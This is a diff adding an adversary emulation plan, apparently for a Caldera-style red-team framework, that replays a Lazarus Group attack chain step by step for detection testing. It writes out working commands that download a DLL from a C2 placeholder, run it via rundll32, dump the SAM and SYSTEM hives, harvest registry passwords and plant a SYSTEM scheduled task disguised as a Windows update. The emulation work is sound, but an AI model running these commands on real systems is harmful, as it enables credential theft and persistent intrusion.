@@ -1,0 +1,330 @@
+---
+- emulation_plan_details:
+    id: d8b5a710-38f3-4e4f-b3b2-658bc57984f4
+    adversary_name: Lazarus_ComparePlus_Emulation
+    adversary_description: >
+      Emulation of a Lazarus Group attack graph using a trojanized Notepad++
+      ComparePlus plugin DLL executed via Rundll32, followed by process injection,
+      WMI lateral movement, registry/SAM credential dumping, scheduled task
+      persistence, and network discovery with a custom SiteShooter tool.
+    attack_version: 8.1
+    format_version: 1.0
+
+# ------------------------------------------------------------
+# Step 1: Initial Access & Execution
+# ------------------------------------------------------------
+
+- id: c43a9b15-97e3-4f5c-89a2-4a0b86a8b13c
+  name: Download Trojanized ComparePlus DLL
+  description: >
+    Download the malicious ComparePlus DLL from an attacker-controlled server
+    defined dynamically by a fact source, simulating initial delivery.
+  tactic: execution
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_initial_access
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $url = "#{lazarus.c2.url}/ComparePlus.dll"
+          $outPath = "C:\Windows\Temp\ComparePlus.dll"
+          Invoke-WebRequest -Uri $url -OutFile $outPath
+  executors:
+  - name: powershell
+    command: |
+      $url = "#{lazarus.c2.url}/ComparePlus.dll"
+      $outPath = "C:\Windows\Temp\ComparePlus.dll"
+      Invoke-WebRequest -Uri $url -OutFile $outPath
+
+- id: f5b721e9-4e5a-4b92-b6d4-3f81e33c69c5
+  name: Execute Trojanized DLL via Rundll32
+  description: >
+    Use rundll32.exe to call the exported function (StartW) of the malicious DLL,
+    which will perform process injection in the background.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.011
+    name: "System Binary Proxy Execution: Rundll32"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_execution
+  procedure_step: "1.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          rundll32.exe C:\Windows\Temp\ComparePlus.dll,StartW
+  executors:
+  - name: command_prompt
+    command: |
+      rundll32.exe C:\Windows\Temp\ComparePlus.dll,StartW
+
+# ------------------------------------------------------------
+# Step 2: Defense Evasion / Process Injection
+# ------------------------------------------------------------
+
+- id: a39d48b1-5e72-4d56-9a2f-1c4b8e7c9f3a
+  name: Verify Process Injection Canary
+  description: >
+    The malicious DLL executed in Step 1.B performed APC process injection
+    into a suspended notepad.exe process. This step verifies that the injection 
+    succeeded by checking for the canary file dropped by the injected code.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1055
+    name: "Process Injection"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_defense_evasion
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Start-Sleep -Seconds 3 # Give the injected process a moment to execute
+          if (Test-Path "C:\Windows\Temp\injection_canary.txt") { 
+              Write-Host "Success: Canary found. Process injection executed properly." 
+          } else { 
+              Write-Error "Failure: Canary missing. Injection failed or was blocked." 
+          }
+  executors:
+  - name: powershell
+    command: |
+      Start-Sleep -Seconds 3
+      if (Test-Path "C:\Windows\Temp\injection_canary.txt") { Write-Host "Success: Canary found. Process injection executed properly." } else { Write-Error "Failure: Canary missing. Injection failed or was blocked." }
+
+# ------------------------------------------------------------
+# Step 3: Lateral Movement
+# ------------------------------------------------------------
+
+- id: b27f31a4-9e8c-4f7d-a1b2-5c6d4e8f9a0b
+  name: WMI Lateral Movement
+  description: >
+    Use wmic to execute a command on a remote target defined by a dynamic fact source.
+    The remote command is benign (writes a canary file) for safe emulation.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1047
+    name: "Windows Management Instrumentation"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_lateral_movement
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI_Lateral_Test > C:\Windows\Temp\wmi_canary.txt"
+  executors:
+  - name: command_prompt
+    command: |
+      wmic /node:#{target.remote.node} process call create "cmd.exe /c echo WMI_Lateral_Test > C:\Windows\Temp\wmi_canary.txt"
+
+# ------------------------------------------------------------
+# Step 4: Credential Access
+# ------------------------------------------------------------
+
+- id: e8c459b2-3f1d-4a7e-9b6c-8a2f1d5e4c3b
+  name: Search Registry for Hardcoded Passwords
+  description: >
+    Use PowerShell to search for DefaultPassword and AltDefaultPassword values
+    in common registry locations. Output is saved to a file for simulated exfil.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.002
+    name: "Unsecured Credentials: Credentials in Registry"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_credential_access
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $keys = @(
+            "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters",
+            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+          )
+          $results = @()
+          foreach ($key in $keys) {
+            if (Test-Path $key) {
+              $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
+              if ($props.DefaultPassword) {
+                $results += "$key -> DefaultPassword: $($props.DefaultPassword)"
+              }
+              if ($props.AltDefaultPassword) {
+                $results += "$key -> AltDefaultPassword: $($props.AltDefaultPassword)"
+              }
+            }
+          }
+          $results | Out-File -FilePath C:\Windows\Temp\registry_creds.txt -Encoding utf8
+  executors:
+  - name: powershell
+    command: |
+      $keys = @(
+        "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\Parameters",
+        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+      )
+      $results = @()
+      foreach ($key in $keys) {
+        if (Test-Path $key) {
+          $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
+          if ($props.DefaultPassword) {
+            $results += "$key -> DefaultPassword: $($props.DefaultPassword)"
+          }
+          if ($props.AltDefaultPassword) {
+            $results += "$key -> AltDefaultPassword: $($props.AltDefaultPassword)"
+          }
+        }
+      }
+      $results | Out-File -FilePath C:\Windows\Temp\registry_creds.txt -Encoding utf8
+
+- id: 7f1a3b5c-9e2d-48a6-bc4f-1d8e5a7c3b9f
+  name: Dump SAM and SYSTEM Hive
+  description: >
+    Use reg save to copy the SAM and SYSTEM hives to a temporary folder,
+    simulating offline credential theft.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: "OS Credential Dumping: Security Account Manager"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_credential_access
+  procedure_step: "4.B"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg save HKLM\SAM C:\Windows\Temp\sam.save /y
+          reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y
+  executors:
+  - name: command_prompt
+    command: |
+      reg save HKLM\SAM C:\Windows\Temp\sam.save /y
+      reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y
+
+# ------------------------------------------------------------
+# Step 5: Persistence
+# ------------------------------------------------------------
+
+- id: 2d8f4c1a-5e9b-43a7-8c1d-9f2b6a5e4c3d
+  name: Scheduled Task for Logon Persistence
+  description: >
+    Create a scheduled task (WindowsUpdateTask) that executes a script on logon
+    to maintain access.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_persistence
+  procedure_step: "5.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          schtasks /create /tn "WindowsUpdateTask" /tr "cmd.exe /c echo Persistence_Task_Ran > C:\Windows\Temp\persist_canary.txt" /sc onlogon /ru System /f
+  executors:
+  - name: command_prompt
+    command: |
+      schtasks /create /tn "WindowsUpdateTask" /tr "cmd.exe /c echo Persistence_Task_Ran > C:\Windows\Temp\persist_canary.txt" /sc onlogon /ru System /f
+
+# ------------------------------------------------------------
+# Step 6: Discovery / Collection (SiteShooter)
+# ------------------------------------------------------------
+
+- id: 9a5b3c1d-8e4f-42a6-b7d1-5c8e9f2a3b4c
+  name: Drop SiteShooter Recon Script
+  description: >
+    Write a PowerShell script (SiteShooter) that gathers detailed network
+    information (ipconfig, netstat, arp, DNS cache) and writes it to a file.
+  tactic: collection
+  technique:
+    attack_id: T1049
+    name: "System Network Connections Discovery"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $script = @'
+          $output = @()
+          $output += "=== IP Configuration ==="
+          $output += ipconfig /all
+          $output += ""
+          $output += "=== Active Network Connections ==="
+          $output += netstat -ano
+          $output += ""
+          $output += "=== ARP Table ==="
+          $output += arp -a
+          $output += ""
+          $output += "=== DNS Cache ==="
+          $output += ipconfig /displaydns
+          $output | Out-File -FilePath C:\Windows\Temp\SiteShooter_results.txt -Encoding utf8
+          '@
+          Set-Content -Path C:\Windows\Temp\SiteShooter.ps1 -Value $script
+  executors:
+  - name: powershell
+    command: |
+      $script = @'
+      $output = @()
+      $output += "=== IP Configuration ==="
+      $output += ipconfig /all
+      $output += ""
+      $output += "=== Active Network Connections ==="
+      $output += netstat -ano
+      $output += ""
+      $output += "=== ARP Table ==="
+      $output += arp -a
+      $output += ""
+      $output += "=== DNS Cache ==="
+      $output += ipconfig /displaydns
+      $output | Out-File -FilePath C:\Windows\Temp\SiteShooter_results.txt -Encoding utf8
+      '@
+      Set-Content -Path C:\Windows\Temp\SiteShooter.ps1 -Value $script
+
+- id: 4c8b2a1f-9e3d-45b7-a6c1-8d5f3e9a2b7c
+  name: Execute SiteShooter to Collect Network Data
+  description: >
+    Run the SiteShooter script to gather network information and store the results.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_discovery
+  procedure_step: "6.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\SiteShooter.ps1
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\SiteShooter.ps1
+
+- id: 6e2d1f4a-7c9b-4835-a1b2-5e9f3c8a4d7b
+  name: Exfiltrate SiteShooter Results (Simulated)
+  description: >
+    Simulate exfiltration by uploading the collected data to a C2 server
+    (here replaced by a local copy for emulation).
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  cti_source: "AttackIQ Intelligence"
+  procedure_group: procedure_exfiltration
+  procedure_step: "6.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          # For safe emulation, simply copy the results to a new name, simulating upload.
+          Copy-Item C:\Windows\Temp\SiteShooter_results.txt C:\Windows\Temp\exfil_$(Get-Date -Format yyyyMMddHHmmss).txt
+  executors:
+  - name: powershell
+    command: |
+      Copy-Item C:\Windows\Temp\SiteShooter_results.txt C:\Windows\Temp\exfil_$(Get-Date -Format yyyyMMddHHmmss).txt
